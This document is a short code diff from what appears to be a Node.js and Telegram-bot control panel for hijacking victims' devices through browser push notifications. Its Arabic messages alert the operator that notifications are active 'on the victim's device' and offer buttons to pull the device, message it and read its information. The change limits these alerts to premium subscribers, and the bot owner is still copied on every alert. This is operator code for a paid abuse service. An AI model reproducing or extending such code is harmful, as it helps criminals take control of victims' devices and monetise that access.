@@ -2577,7 +2577,9 @@ app.get("/push-stream", (req, res) => {
       [{ text: "📲 سحب الجهاز", callback_data: `pull:${pid}` }, { text: "📩 إرسال رسالة", callback_data: `pushmsg:${pid}` }],
       [{ text: "📋 معلومات الجهاز", callback_data: `pushinfo:${pid}` }]
     ] }) };
-    bot.sendMessage(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n🆔 \`${pid}\``, { parse_mode:"Markdown", ..._pushKb });
+    if (isPremium(tid)) {
+      bot.sendMessage(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n🆔 \`${pid}\``, { parse_mode:"Markdown", ..._pushKb });
+    }
     if (tid !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 \`${pid}\`\n(Creator: ${tid})`, { parse_mode:"Markdown", ..._pushKb });
   } else {
     // Update purl if changed
